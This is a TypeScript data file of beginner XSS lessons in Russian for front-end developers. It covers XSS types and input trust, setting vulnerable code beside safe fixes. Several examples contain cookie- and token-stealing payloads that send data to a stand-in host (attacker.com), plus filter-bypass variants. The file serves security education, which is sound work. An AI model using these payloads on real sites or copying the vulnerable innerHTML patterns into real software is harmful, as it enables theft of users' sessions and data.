import { Topic } from '../../../types';

export const SECURITY_XSS_BEGINNER_TOPICS: Topic[] = [
  {
    id: 'xss-basics',
    title: 'Что такое XSS и почему это опасно',
    description: 'XSS (Cross-Site Scripting) — это уязвимость, позволяющая злоумышленнику внедрить и выполнить вредоносный JavaScript код в контексте другого веб-сайта. Это одна из самых распространенных и опасных уязвимостей для фронтенд-приложений.',
    difficulty: 'beginner',
    isFrontendEssential: true,
    tags: ['security', 'xss', 'basics', 'vulnerability', 'front-end-essential'],
    keyPoints: [
      'XSS позволяет выполнить произвольный JavaScript код в браузере жертвы.',
      'Атакующий может украсть cookies, токены, персональные данные.',
      'Может выполнять действия от имени пользователя (отправка форм, изменение данных).',
      'XSS — одна из самых частых тем на собеседованиях по безопасности.',
      'Никогда не доверять пользовательскому вводу без проверки и санитизации.'
    ],
    examples: [
      {
        title: 'Базовый пример XSS атаки',
        code: `// ❌ Уязвимый код
const userComment = "<script>alert('XSS')</script>";
document.getElementById('comment').innerHTML = userComment;
// Выполнится alert!

// ❌ Более опасный пример
const userInput = "<img src=x onerror='fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)'>";
document.getElementById('output').innerHTML = userInput;
// Отправит cookies злоумышленнику

// ✅ Безопасный код
const userComment = "<script>alert('XSS')</script>";
document.getElementById('comment').textContent = userComment;
// Отобразится как текст, не выполнится`
      },
      {
        title: 'Что может сделать XSS',
        code: `// 1. Украсть cookies и токены
document.cookie; // Все cookies доступны

// 2. Выполнить действия от имени пользователя
fetch('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ to: 'attacker', amount: 1000 })
});

// 3. Изменить содержимое страницы
document.body.innerHTML = '<h1>You have been hacked!</h1>';

// 4. Перенаправить на вредоносный сайт
window.location.href = 'https://attacker.com';

// 5. Украсть данные из localStorage
const token = localStorage.getItem('token');
fetch('https://attacker.com/steal?token=' + token);`
      }
    ],
    relatedTopics: ['xss-types', 'xss-prevention', 'csp-basics']
  },
  {
    id: 'xss-types',
    title: 'Типы XSS: Reflected, Stored, DOM-based',
    description: 'Существует три основных типа XSS атак: Reflected (отраженный), Stored (хранимый) и DOM-based (на основе DOM). Каждый тип имеет свои особенности и требует разных подходов к защите.',
    difficulty: 'beginner',
    isFrontendEssential: true,
    tags: ['security', 'xss', 'types', 'reflected', 'stored', 'dom-based', 'front-end-essential'],
    keyPoints: [
      'Reflected XSS: вредоносный код отражается от сервера (в URL, параметрах запроса).',
      'Stored XSS: вредоносный код сохраняется на сервере (в БД, комментариях).',
      'DOM-based XSS: вредоносный код обрабатывается только на клиенте (без участия сервера).',
      'Reflected и Stored требуют участия сервера, DOM-based — только клиента.',
      'Все три типа опасны и требуют защиты.'
    ],
    examples: [
      {
        title: 'Reflected XSS',
        code: `// URL: https://example.com/search?q=<script>alert('XSS')</script>

// ❌ Уязвимый код на сервере
const query = req.query.q;
res.send(\`<div>Результаты поиска: \${query}</div>\`);

// Или на клиенте
const urlParams = new URLSearchParams(window.location.search);
const query = urlParams.get('q');
document.getElementById('results').innerHTML = query; // ❌

// ✅ Безопасно
document.getElementById('results').textContent = query;`
      },
      {
        title: 'Stored XSS',
        code: `// Пользователь оставляет комментарий с вредоносным кодом
const comment = "<script>stealCookies()</script>";

// ❌ Сохраняется в БД и отображается другим пользователям
// При загрузке страницы выполнится для всех посетителей

// Пример уязвимого кода
function displayComments(comments) {
  comments.forEach(comment => {
    const div = document.createElement('div');
    div.innerHTML = comment.text; // ❌
    document.body.appendChild(div);
  });
}

// ✅ Безопасно
function displayComments(comments) {
  comments.forEach(comment => {
    const div = document.createElement('div');
    div.textContent = comment.text; // ✅
    document.body.appendChild(div);
  });
}`
      },
      {
        title: 'DOM-based XSS',
        code: `// Вредоносный код только на клиенте, сервер не участвует

// ❌ Уязвимый код
const hash = window.location.hash.substring(1); // #<script>alert('XSS')</script>
document.getElementById('content').innerHTML = hash;

// Или через eval (никогда не использовать!)
const userInput = window.location.search.split('=')[1];
eval(userInput); // ❌ Очень опасно!

// ✅ Безопасно
const hash = window.location.hash.substring(1);
document.getElementById('content').textContent = hash;

// Или с санитизацией
const sanitized = DOMPurify.sanitize(hash);
document.getElementById('content').innerHTML = sanitized;`
      }
    ],
    relatedTopics: ['xss-basics', 'xss-prevention', 'csp-basics']
  },
  {
    id: 'xss-trust-input',
    title: 'Почему никогда не доверять пользовательскому вводу',
    description: 'Пользовательский ввод — это всегда потенциально опасные данные. Даже если источник кажется надежным, данные могут быть скомпрометированы на любом этапе передачи. Принцип "не доверяй, проверяй" — основа безопасной разработки.',
    difficulty: 'beginner',
    isFrontendEssential: true,
    tags: ['security', 'xss', 'input-validation', 'trust', 'front-end-essential'],
    keyPoints: [
      'Любой пользовательский ввод потенциально опасен.',
      'Данные могут быть изменены при передаче (Man-in-the-Middle).',
      'Даже "доверенные" источники могут быть скомпрометированы.',
      'Всегда валидировать и санитизировать ввод на клиенте И сервере.',
      'Использовать whitelist подход (разрешать только известное хорошее), а не blacklist.'
    ],
    examples: [
      {
        title: 'Примеры опасного ввода',
        code: `// ❌ Опасно: доверие к любому источнику

// URL параметры
const userId = new URLSearchParams(location.search).get('id');
document.getElementById('user').innerHTML = userId; // ❌

// Cookies
const theme = document.cookie.split('theme=')[1];
document.body.className = theme; // ❌

// localStorage
const userData = JSON.parse(localStorage.getItem('user'));
document.getElementById('name').innerHTML = userData.name; // ❌

// Данные из API (могут быть скомпрометированы)
fetch('/api/user').then(r => r.json()).then(data => {
  document.getElementById('bio').innerHTML = data.bio; // ❌
});

// ✅ Безопасно: всегда проверять и санитизировать
function sanitizeInput(input: string): string {
  const div = document.createElement('div');
  div.textContent = input;
  return div.innerHTML;
}

const userId = new URLSearchParams(location.search).get('id');
document.getElementById('user').textContent = userId || 'Unknown'; // ✅`
      },
      {
        title: 'Whitelist vs Blacklist',
        code: `// ❌ Blacklist подход (плохо)
function sanitizeBlacklist(input: string): string {
  return input.replace(/<script>/gi, ''); // Легко обойти!
}
// Обход: <ScRiPt>, <script src="...">, <img onerror="...">

// ✅ Whitelist подход (хорошо)
function sanitizeWhitelist(input: string): string {
  // Разрешаем только буквы, цифры, пробелы
  return input.replace(/[^a-zA-Z0-9\\s]/g, '');
}

// Или использовать готовую библиотеку
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
  ALLOWED_ATTR: []
});`
      }
    ],
    relatedTopics: ['xss-basics', 'xss-prevention', 'api-security-validation']
  }
];
